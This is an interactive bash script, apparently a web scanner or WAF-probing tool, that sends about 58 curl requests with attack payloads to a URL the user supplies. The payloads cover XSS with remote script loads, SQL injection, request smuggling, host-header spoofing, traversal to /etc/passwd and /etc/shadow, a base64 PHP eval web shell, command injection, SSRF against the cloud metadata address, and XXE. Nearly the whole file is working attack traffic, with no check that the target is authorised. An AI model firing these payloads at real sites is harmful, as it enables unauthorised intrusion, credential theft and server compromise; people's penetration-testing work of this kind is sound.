#!/bin/bash



url=$1

n=$2

domain=$(echo $url | awk -F/ '{print $3}')


######


echo 'Wanna test XSS?'
read xss_flag && printf '\n'


if test $xss_flag -eq 1; then


echo '1) GET '$url'/?id=data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=/' && printf '\n' && curl -X GET -H "User-Agent: flex" $url'/?id=data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=/' -s -o /dev/null -w "%{http_code}, %{size_download}" && printf '\n\n' && echo 'Payload 1 tested' && printf '\n' && sleep $n


echo '2) GET '$url'/javascript:alert()/' && printf '\n' && curl -X GET -H "User-Agent: flex" $url'/javascript:alert()/' -s -o /dev/null -w "%{http_code}, %{size_download}" && printf '\n\n' && echo 'Payload 2 tested' && printf '\n' && sleep $n


echo '3) GET '$url'/"><script>alert(1)</script>/' && printf '\n' && curl -X GET -H "User-Agent: flex" $url'/"><script>alert(1)</script>/' -s -o /dev/null -w "%{http_code}, %{size_download}" && printf '\n\n' && echo 'Payload 3 tested' && printf '\n' && sleep $n


echo '4) GET '$url'/"><img/src/onerror=alert(1)>/' && printf '\n' && curl -X GET -H "User-Agent: flex" $url'/"><img/src/onerror=alert(1)>/' -s -o /dev/null -w "%{http_code}, %{size_download}" && printf '\n\n' && echo 'Payload 4 tested' && printf '\n' && sleep $n


echo '5) GET '$url'/<SCRIPT/SRC="http://test.rocks/test.js"></SCRIPT>/' && printf '\n' && curl -X GET -H "User-Agent: flex" $url'/<SCRIPT/SRC="http://test.rocks/test.js"></SCRIPT>/' -s -o /dev/null -w "%{http_code}, %{size_download}" && printf '\n\n' && echo 'Payload 5 tested' && printf '\n' && sleep $n


echo '6) GET '$url'/<SCRIPT%20SRC=//test.rocks/.js>/' && printf '\n' && curl -X GET -H "User-Agent: flex" $url'/<SCRIPT%20SRC=//xss.rocks/.js>/' -s -o /dev/null -w "%{http_code}, %{size_download}" && printf '\n\n' && echo 'Payload 6 tested' && printf '\n' && sleep $n


echo '7) GET '$url"/<IMG%20SRC='vbscript:msgbox('XSS')'>/" && printf '\n' && curl -X GET -H "User-Agent: flex" $url"/<IMG%20SRC='vbscript:msgbox('XSS')'>/" -s -o /dev/null -w "%{http_code}, %{size_download}" && printf '\n\n' && echo 'Payload 7 tested' && printf '\n' && sleep $n


echo 'XSS done' && printf '\n\n'

fi


######


echo 'Wanna test SQLi?'
read sqli_flag && printf '\n'


if test $sqli_flag -eq 1; then


echo '8) GET '$url"/'XOR(if(now()=sysdate(),sleep(5*5),0))OR'/" && printf '\n' && curl -X GET -H "User-Agent: flex" $url"/'XOR(if(now()=sysdate(),sleep(5*5),0))OR'/" -s -o /dev/null -w "%{http_code}, %{size_download}" && printf '\n\n' && echo 'Payload 8 tested' && printf '\n' && sleep $n



echo '9) GET '$url"/,(select%20*%20from%20(select(sleep(10)))a)/" && printf '\n' && curl -X GET -H "User-Agent: flex" $url"/,(select%20*%20from%20(select(sleep(10)))a)/" -s -o /dev/null -w "%{http_code}, %{size_download}" && printf '\n\n' && echo 'Payload 9 tested' && printf '\n' && sleep $n



echo '10) GET '$url"/';WAITFOR%20DELAY%20'0:0:30'--%22/" && printf '\n' && curl -X GET -H "User-Agent: flex" $url"/';WAITFOR%20DELAY%20'0:0:30%27--%22/" -s -o /dev/null -w "%{http_code}, %{size_download}" && printf '\n\n' && echo 'Payload 10 tested' && printf '\n' && sleep $n



echo '11) GET '$url"/concat(0x273e27,version(),0x3c212d2d)/" && printf '\n' && curl -X GET -H "User-Agent: flex" $url"/concat(0x273e27,version(),0x3c212d2d)/" -s -o /dev/null -w "%{http_code}, %{size_download}" && printf '\n\n' && echo 'Payload 11 tested' && printf '\n' && sleep $n



echo '12) GET '$url"/?id=1+union+select+1,2,3/*/" && printf '\n' && curl -X GET -H "User-Agent: flex" $url"/?id=1+union+select+1,2,3/*/" -s -o /dev/null -w "%{http_code}, %{size_download}" && printf '\n\n' && echo 'Payload 12 tested' && printf '\n' && sleep $n



echo '13) GET '$url"/or%201--%20-'%20or%201%20or%20'1%22or%201%20or%22" && printf '\n' && curl -X GET -H "User-Agent: flex" $url"/or%201--%20-'%20or%201%20or%20'1%22or%201%20or%22" -s -o /dev/null -w "%{http_code}, %{size_download}" && printf '\n\n' && echo 'Payload 13 tested' && printf '\n' && sleep $n



echo '14) POST '$url "'XOR(if(now()=sysdate(),sleep(5*5),0))OR'" && printf '\n' && curl -X POST -H "User-Agent: flex" -d "'XOR(if(now()=sysdate(),sleep(5*5),0))OR'" $url -s -o /dev/null -w "%{http_code}, %{size_download}" && printf '\n\n' && echo 'Payload 14 tested' && printf '\n' && sleep $n



echo '15) POST '$url ',(select%20*%20from%20(select(sleep(10)))a)' && printf '\n' && curl -X POST -H "User-Agent: flex" -d "abc=,(select%20*%20from%20(select(sleep(10)))a)" $url -s -o /dev/null -w "%{http_code}, %{size_download}" && printf '\n\n' && echo 'Payload 15 tested' && printf '\n' && sleep $n



echo '16) POST '$url "';WAITFOR%20DELAY%20'0:0:30'--%22" && printf '\n' && curl -X POST -H "User-Agent: flex" -d "abc=';WAITFOR%20DELAY%20'0:0:30'--%22" $url -s -o /dev/null -w "%{http_code}, %{size_download}" && printf '\n\n' && echo 'Payload 16 tested' && printf '\n' && sleep $n



echo '17) POST '$url "abc=concat(0x273e27,version(),0x3c212d2d)" && printf '\n' && curl -X POST -H "User-Agent: flex" -d "abc=concat(0x273e27,version(),0x3c212d2d)" $url -s -o /dev/null -w "%{http_code}, %{size_download}" && printf '\n\n' && echo 'Payload 17 tested' && printf '\n' && sleep $n



echo '18) POST '$url "id=1+union+select+1,2,3/*" && printf '\n' && curl -X POST -H "User-Agent: flex" -d "id=1+union+select+1,2,3/*" $url -s -o /dev/null -w "%{http_code}, %{size_download}" && printf '\n\n' && echo 'Payload 18 tested' && printf '\n' && sleep $n



echo '19) POST '$url "id=or%201--%20-'%20or%201%20or%20'1%22or%201%20or%22" && printf '\n' && curl -X POST -H "User-Agent: flex" -d "id=or%201--%20-'%20or%201%20or%20'1%22or%201%20or%22" $url -s -o /dev/null -w "%{http_code}, %{size_download}" && printf '\n\n' && echo 'Payload 19 tested' && printf '\n' && sleep $n


echo 'SQLi done' && printf '\n'

fi


######


echo 'Wanna test HTTP Request Smuggling?'
read smug_flag && printf '\n'

if test $smug_flag -eq 1; then


echo '20) GET inside POST not full '$url && printf '\n' && curl -X POST -H "User-Agent: flex" -H 'Host: '$domain -H 'Content-Type: application/x-www-form-urlencoded' -H 'Content-Length: 1' -H 'Transfer-Encoding: chunked' -d "@data20.txt" $url -s -o /dev/null -w "%{http_code}, %{size_download}" && printf '\n\n' && echo 'Payload 20 tested' && printf '\n' && sleep $n


echo '21) POST inside GET not full '$url && printf '\n' && curl -X GET -H "User-Agent: flex" -H 'Foo: xPOST /search HTTP/1.1' -H 'Host: '$domain -H 'Content-Type: application/x-www-form-urlencoded' -H 'Content-Length: 11' -d "q=smuggling" $url -s -o /dev/null -w "%{http_code}, %{size_download}" && printf '\n\n' && echo 'Payload 21 tested' && printf '\n' && sleep $n


echo '22) GET inside POST full '$url && printf '\n' && curl -X POST -H "User-Agent: flex" -H 'Host: '$domain -H 'Content-Type: application/x-www-form-urlencoded' -H 'Content-Length: 4' -H 'Transfer-Encoding: chunked' -d "@data22.txt" $url -s -o /dev/null -w "%{http_code}, %{size_download}" && printf '\n\n' && echo 'Payload 22 tested' && printf '\n' && sleep $n


echo '23) POST inside GET full '$url && printf '\n' && curl -X GET -H "User-Agent: flex" -H 'Host: '$domain -H 'Content-Type: application/x-www-form-urlencoded' -H 'Content-Length: 146' -d "@data23.txt" $url -s -o /dev/null -w "%{http_code}, %{size_download}" && printf '\n\n' && echo 'Payload 23 tested' && printf '\n' && sleep $n


echo 'HTTP Request Smuggling done' && printf '\n'

fi



######


echo 'Wanna test Host Header Attacks?'
read hha_flag && printf '\n'

if test $hha_flag -eq 1; then


echo '24) GET Double host '$url && printf '\n' && curl -X GET -H "User-Agent: flex" -H 'Host: '$domain -H 'Host: evil-website.com' $url -s -o /dev/null -w "%{http_code}, %{size_download}" && printf '\n\n' && echo 'Payload 24 tested' && printf '\n' && sleep $n


echo '25) GET X-Forwarded-For '$url && printf '\n' && curl -X GET -H "User-Agent: flex" -H 'Host: '$domain -H 'X-Forwarded-For: evil-website.com' $url -s -o /dev/null -w "%{http_code}, %{size_download}" && printf '\n\n' && echo 'Payload 25 tested' && printf '\n' && sleep $n


echo '26) GET X-Forwarded-Host '$url && printf '\n' && curl -X GET -H "User-Agent: flex" -H 'Host: '$domain -H 'X-Forwarded-Host: evil-website.com' $url -s -o /dev/null -w "%{http_code}, %{size_download}" && printf '\n\n' && echo 'Payload 26 tested' && printf '\n' && sleep $n


echo '27) GET X-Client-IP '$url && printf '\n' && curl -X GET -H "User-Agent: flex" -H 'Host: '$domain -H 'X-Client-IP: evil-website.com' $url -s -o /dev/null -w "%{http_code}, %{size_download}" && printf '\n\n' && echo 'Payload 27 tested' && printf '\n' && sleep $n


echo '28) GET X-Remote-IP '$url && printf '\n' && curl -X GET -H "User-Agent: flex" -H 'Host: '$domain -H 'X-Remote-IP: evil-website.com' $url -s -o /dev/null -w "%{http_code}, %{size_download}" && printf '\n\n' && echo 'Payload 28 tested' && printf '\n' && sleep $n


echo '29) GET X-Remote-Addr '$url && printf '\n' && curl -X GET -H "User-Agent: flex" -H 'Host: '$domain -H 'X-Remote-Addr: evil-website.com' $url -s -o /dev/null -w "%{http_code}, %{size_download}" && printf '\n\n' && echo 'Payload 29 tested' && printf '\n' && sleep $n


echo '30) GET X-Host '$url && printf '\n' && curl -X GET -H "User-Agent: flex" -H 'Host: '$domain -H 'X-Host: evil-website.com' $url -s -o /dev/null -w "%{http_code}, %{size_download}" && printf '\n\n' && echo 'Payload 30 tested' && printf '\n' && sleep $n


echo 'Host Header Attacks done' && printf '\n'

fi


######


echo 'Wanna test Path traversal?'
read pathtrav_flag && printf '\n'

if test $pathtrav_flag -eq 1; then


echo '31) GET '$url'/../../../../etc/passwd/' && printf '\n' && curl -X GET -H "User-Agent: flex" $url'/../../../../etc/passwd/' -s -o /dev/null -w "%{http_code}, %{size_download}" && printf '\n\n' && echo 'Payload 31 tested' && printf '\n' && sleep $n


echo '32) GET '$url'/../../../../etc/shadow/' && printf '\n' && curl -X GET -H "User-Agent: flex" $url'/../../../../../../../../../../etc/shadow/' -s -o /dev/null -w "%{http_code}, %{size_download}" && printf '\n\n' && echo 'Payload 32 tested' && printf '\n' && sleep $n


echo '33) GET '$url'/?file=data:;base64,PD9waHAgZXZhbCgkX1JFUVVFU1RbY21kXSk7ID8%2b&cmd=phpinfo();/' && printf '\n' && curl -X GET -H "User-Agent: flex" $url'/?file=data:;base64,PD9waHAgZXZhbCgkX1JFUVVFU1RbY21kXSk7ID8%2b&cmd=phpinfo();/' -s -o /dev/null -w "%{http_code}, %{size_download}" && printf '\n\n' && echo 'Payload 33 tested' && printf '\n' && sleep $n


echo '34) GET '$url'/?file=/../../../../../etc/passwd%00/' && printf '\n' && curl -X GET -H "User-Agent: flex" $url'/?file=/../../../../../etc/passwd%00/' -s -o /dev/null -w "%{http_code}, %{size_download}" && printf '\n\n' && echo 'Payload 34 tested' && printf '\n' && sleep $n



echo '35) GET '$url' Cookie: file=/../../../../../etc/passwd' && printf '\n' && curl -X GET -H "User-Agent: flex" -H 'Cookie: file=/../../../../../etc/passwd' $url -s -o /dev/null -w "%{http_code}, %{size_download}"  && printf '\n\n' && echo 'Payload 35 tested' && printf '\n' && sleep $n


echo '36) POST '$url' /../../../../etc/passwd' && printf '\n' && curl -X POST -H "User-Agent: flex" $url -d 'file=/../../../../etc/passwd' -s -o /dev/null -w "%{http_code}, %{size_download}" && printf '\n\n' && echo 'Payload 36 tested' && printf '\n' && sleep $n


echo '37) POST '$url' /../../../../etc/shadow' && printf '\n' && curl -X POST -H "User-Agent: flex" $url -d 'file=/../../../../etc/shadow' -s -o /dev/null -w "%{http_code}, %{size_download}" && printf '\n\n' && echo 'Payload 37 tested' && printf '\n' && sleep $n


echo '38) POST '$url' file=data:;base64,PD9waHAgZXZhbCgkX1JFUVVFU1RbY21kXSk7ID8%2b&cmd=phpinfo();' && printf '\n' && curl -X POST -H "User-Agent: flex" $url -d 'file=data:;base64,PD9waHAgZXZhbCgkX1JFUVVFU1RbY21kXSk7ID8%2b&cmd=phpinfo();' -s -o /dev/null -w "%{http_code}, %{size_download}" && printf '\n\n' && echo 'Payload 38 tested' && printf '\n' && sleep $n


echo '39) POST '$url' file=/../../../../../etc/passwd%00' && printf '\n' && curl -X POST -H "User-Agent: flex" $url -d 'file=/../../../../../etc/passwd%00' -s -o /dev/null -w "%{http_code}, %{size_download}" && printf '\n\n' && echo 'Payload 39 tested' && printf '\n' && sleep $n


echo '40) POST Cookie '$url' file=/../../../../../etc/passwd%00' && printf '\n' && curl -X POST -H "User-Agent: flex" -H 'Cookie: file=/../../../../../etc/passwd' $url -s -o /dev/null -w "%{http_code}, %{size_download}"  && printf '\n\n' && echo 'Payload 40 tested' && printf '\n' && sleep $n


echo 'Path traversal done' && printf '\n'

fi


######


echo 'Wanna test Command Injections?'
read comminj_flag && printf '\n'

if test $comminj_flag -eq 1; then


echo '41) GET '$url"/;system('cat%20/etc/passwd')/" && printf '\n' && curl -X GET -H "User-Agent: flex" $url"/;system('cat%20/etc/passwd')/" -s -o /dev/null -w "%{http_code}, %{size_download}" && printf '\n\n' && echo 'Payload 41 tested' && printf '\n' && sleep $n


echo '42) GET '$url"|/bin/ls%20-al/" && printf '\n' && curl -X GET -H "User-Agent: flex" $url"/|/bin/ls%20-al/" -s -o /dev/null -w "%{http_code}, %{size_download}" && printf '\n\n' && echo 'Payload 42 tested' && printf '\n' && sleep $n


echo '43) GET '$url'/<?php%20system("cat%20/etc/passwd");?>/' && printf '\n' && curl -X GET -H "User-Agent: flex" $url'/<?php%20system("cat%20/etc/passwd");?>/' -s -o /dev/null -w "%{http_code}, %{size_download}" && printf '\n\n' && echo 'Payload 43 tested' && printf '\n' && sleep $n


echo '44) GET '$url"/;netstat%20-a;/" && printf '\n' && curl -X GET -H "User-Agent: flex" $url"/;netstat%20-a;/" -s -o /dev/null -w "%{http_code}, %{size_download}" && printf '\n\n' && echo 'Payload 44 tested' && printf '\n' && sleep $n




echo '45) POST '$url" ;system('cat%20/etc/passwd')" && printf '\n' && curl -X POST -H "User-Agent: flex" $url -d "a=;system('cat%20/etc/passwd')" -s -o /dev/null -w "%{http_code}, %{size_download}" && printf '\n\n' && echo 'Payload 45 tested' && printf '\n' && sleep $n


echo '46) POST '$url" |/bin/ls%20-al" && printf '\n' && curl -X POST -H "User-Agent: flex" $url -d "a=|/bin/ls%20-al" -s -o /dev/null -w "%{http_code}, %{size_download}" && printf '\n\n' && echo 'Payload 46 tested' && printf '\n' && sleep $n


echo '47) POST '$url' <?php%20system("cat%20/etc/passwd");?>' && printf '\n' && curl -X POST -H "User-Agent: flex" $url -d 'a=<?php%20system("cat%20/etc/passwd");?>' -s -o /dev/null -w "%{http_code}, %{size_download}" && printf '\n\n' && echo 'Payload 47 tested' && printf '\n' && sleep $n


echo '48) POST '$url" ;netstat%20-a;" && printf '\n' && curl -X POST -H "User-Agent: flex" $url -d "a=;netstat%20-a;" -s -o /dev/null -w "%{http_code}, %{size_download}" && printf '\n\n' && echo 'Payload 48 tested' && printf '\n' && sleep $n



echo 'Command Injections done' && printf '\n'

fi


######


echo 'Wanna test http0.9 + http2?'
read http092_flag && printf '\n'

if test $http092_flag -eq 1; then

echo '49) GET '$url" HTTP 2" && printf '\n' && curl -X GET -H "User-Agent: flex" --http2 $url -s -o /dev/null -w "%{http_code}, %{size_download}" && printf '\n\n' && echo 'Payload 49 tested' && printf '\n' && sleep $n


echo '50) GET '$url" HTTP 0.9" && printf '\n' && curl -X GET -H "User-Agent: flex" --http0.9 $url -s -o /dev/null -w "%{http_code}, %{size_download}" && printf '\n\n' && echo 'Payload 50 tested' && printf '\n' && sleep $n


echo 'http0.9 + http2 done' && printf '\n'

fi


######


echo 'Wanna test SSRF?'
read SSRF_flag && printf '\n'

if test $SSRF_flag -eq 1; then

echo '51) GET '$url'/?url=http://127.0.0.1/' && printf '\n' && curl -X GET -H "User-Agent: flex" $url'/?url=http://127.0.0.1/' -s -o /dev/null -w "%{http_code}, %{size_download}" && printf '\n\n' && echo 'Payload 51 tested' && printf '\n' && sleep $n


echo '52) GET '$url'/?url=http://0.0.0.0:80/' && printf '\n' && curl -X GET -H "User-Agent: flex" $url'/?url=http://0.0.0.0:80/' -s -o /dev/null -w "%{http_code}, %{size_download}" && printf '\n\n' && echo 'Payload 52 tested' && printf '\n' && sleep $n


echo '53) GET '$url'/?url=http://[::]:80/' && printf '\n' && curl -X GET -H "User-Agent: flex" $url'/?url=http://[::]:80/' -s -o /dev/null -w "%{http_code}, %{size_download}" && printf '\n\n' && echo 'Payload 53 tested' && printf '\n' && sleep $n


echo '54) GET '$url'/?url=http://169.254.169.254/' && printf '\n' && curl -X GET -H "User-Agent: flex" $url'/?url=http://169.254.169.254/' -s -o /dev/null -w "%{http_code}, %{size_download}" && printf '\n\n' && echo 'Payload 54 tested' && printf '\n' && sleep $n


echo '55) GET '$url'/?url=http://2130706433/' && printf '\n' && curl -X GET -H "User-Agent: flex" $url'/?url=http://2130706433/' -s -o /dev/null -w "%{http_code}, %{size_download}" && printf '\n\n' && echo 'Payload 55 tested' && printf '\n' && sleep $n


echo '56) GET '$url'/?url=https://'$domain'@evil.com/' && printf '\n' && curl -X GET -H "User-Agent: flex" $url'/?url=https://'$domain'@evil.com/' -s -o /dev/null -w "%{http_code}, %{size_download}" && printf '\n\n' && echo 'Payload 56 tested' && printf '\n' && sleep $n

echo 'SSRF done' && printf '\n'

fi


######
 
 
echo 'Wanna test XXE?'
read XXE_flag && printf '\n'

if test $XXE_flag -eq 1; then


echo '57) XXE1 in POST '$url && printf '\n' && curl -X POST -H "User-Agent: flex" -H 'Content-Type: application/xml' -H 'Content-Length: 143' -d "@data57.xml" $url -s -o /dev/null -w "%{http_code}, %{size_download}" && printf '\n\n' && echo 'Payload 57 tested' && printf '\n' && sleep $n


echo '58) XXE2 in POST '$url && printf '\n' && curl -X POST -H "User-Agent: flex" -H 'Content-Type: application/xml' -H 'Content-Length: 137' -d "@data58.xml" $url -s -o /dev/null -w "%{http_code}, %{size_download}" && printf '\n\n' && echo 'Payload 58 tested' && printf '\n' && sleep $n



fi
